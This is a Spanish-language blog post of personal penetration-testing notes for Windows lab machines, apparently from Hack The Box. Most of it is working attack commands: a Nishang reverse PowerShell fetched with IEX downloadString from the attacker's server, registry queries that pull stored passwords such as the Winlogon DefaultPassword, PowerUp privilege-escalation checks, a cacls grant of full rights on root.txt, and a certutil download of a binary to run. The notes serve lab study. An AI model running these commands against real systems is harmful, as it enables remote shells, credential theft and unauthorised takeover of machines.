---
layout: post
title: "Apuntes Maquinas Windows"
subtitle: 'apuntes recopilados para cada una de las maquinas windows que voy haciendo'
date: 2020-08-12 12:00:00
author: "TheusZero"
header-img: "images/post/windows/windowsApuntes.png"
catalog: true
comments: true
tags:
  - Windows
  - Machine
  - Explotations
  - Upgrade
  - Shell
  - Root
  - User
---

## Links Ricolinos

[Optium-HackTheBox](https://www.youtube.com/watch?v=fIGvOGrdxyc&list=PLlb2ZjHtNkpiSbrOfeRASNsvpHD6bEWoA)
[]()

## PowerShell
[powershells para windows](https://github.com/samratashok/nishang)

#### Pasos para invocar una una powerShell Manual
> recordar usar nc -nlvp port

> nishang/shells/Invoke_PowerShellTCP.ps1 

> colocar esto al final del invoke powershell **Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443**

> abrir un SimpleHTTPServer en el puerto 8000

> dentro de la maquina, escribir: ```start /b powershell IEX(New-Object Net.webClient).downloadString('http://MyIpAdrress:8000/Invoke_PowerShellTCP.ps1')```
>> esto ejecutara e interpretara el archivo ps1

ahora, cuando ya tenemos acceso con la powerShell debemos obtener un reconocimiento del sistema, debido a la utilizacion de la powershell no segura y de manera bruta podemos obtener una cantidad grande de *falsos positivos*, por eso mismo intentaremos jugar con comandos del sistema para asi poder acceder a una verdadera forma de escalar privilegios.

```Python
[Environment]::Is64BitsOperatingSystem
```

```Python
[Environment]::Is64BitsProcess
```
> si es falso, este proceso de shell es de 32bits, por lo que tenemos que migrar a mano a un proceso de 64 bits si o si debemos migrar

```start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://MyIpAdrress:8000/Invoke_PowerShellTCP.ps1')```
con esto logramos crear una powerShell que trabaje en 64bits, por lo que volvemos a lanzar un netcat para obtener la reverse shell otra vez

> preguntamos otra vez :
>> ```[Environment]::Is64BitsProcess```

una vez que es true podemos continuar y no van a darnos falsos positivos

## Privesec

#### obtencion de passwords
```Python
reg query HKLM /f  password /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul |findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

#### winexe
ya cuando tenemos el tunnel hecho
```Python
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

#### netstat
recordar el exploit zzz para el samba
```Python
netstat -nat
```

#### windows suggester
[windows exploit suggester bacan](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

> python windows-exploit-suggester.py --update

> instalar python-xlrd con sudo apt-get install 

> python windows-exploit-suggester.py --database (archivo que se creo) --systeminfo systeminfo.txt (archivo que creamos)

**ir de arriba hacia abajo en los exploits que encontro**

[weseng](https://github.com/bitsadmin/wesng)

se copia todo el output en un archivo .txt y se ejecuta el comando o binario del wesng

#### ver permisos de ejecucion y como se ejecuta (tipo SUID)

```Python
PS C:\Users\Public\Desktop> $sh = New-Object -ComObject Wscript.Shell
PS C:\Users\Public\Desktop> $target = $sh.CreateShortcut('C:\Users\Public\Desktop\theprogram')
PS C:\Users\Public\Desktop> echo $target
```

#### whoami
```Python
whoami /priv
```

#### powerSploit
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

powersploit tiene un modulo para el privesec llamado **PowerUp.ps1**

> mismo principio de la powershell, se coloca esta linea al final del documento
```Python
Invoke-AllChecks
```

luego:

```Python
IEX(New-Object Net.WebClient).downloadString('http://myIp:8000/PowerUp.ps1')
```

#### cacls (access control list)
permisos para cada usuario, donde F es Full privilegios

```Python
cacls Administrator
```

```Python
cacls root.txt /grant TheUserMY:F
Y (yes)
```

## subir archivos binarios y ejecturlos en la maquina

> abrir un SimpleHttpServer para el binario

> en la maquina escribir
>> ```certutil.exe -f -urlcache -split http://myIpAdress/theBinary.exe thebinary.exe```

## samba and rpc cheatsheets

```Python
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
```

```Python
sudo smbclient -L //<HOST_IP_OR_NAME> -U <USERNAME%PASSWORD>

sudo smbclient -L //<HOST_IP_OR_NAME> -U <USERNAME%PASSOWRD> -g | grep Disk | cut -f 1 -d '|'
## LIST only the names of the shared Disk
```

```Python
rpcclient -U username ip
```

#### mount a smb folder in the host sistem
```Python
cd /mnt
mkdir smbMounted
cd smbMounted
mount -t cifs //IPAtacking/Folder /mnt/smbMounted -o username=null,password=null,domain=WORKGROUP,rw
```

## ssh

```Python
# SEND FILES THROUGH SSH
# ======================
## copy file from local over to remote server
scp -i <.ssh/key> <local/file> <user>@<host_name_or_ip>:<destination>
## using config
scp <local/file> <hostname>:<destination>
## copy file from remote server to local
scp -i <.ssh/key> <user>@<host_name_or_ip>:<file/to/copy> <local/destination>
## using config
scp <hostname>:<file/to/copy> <local/destination>
```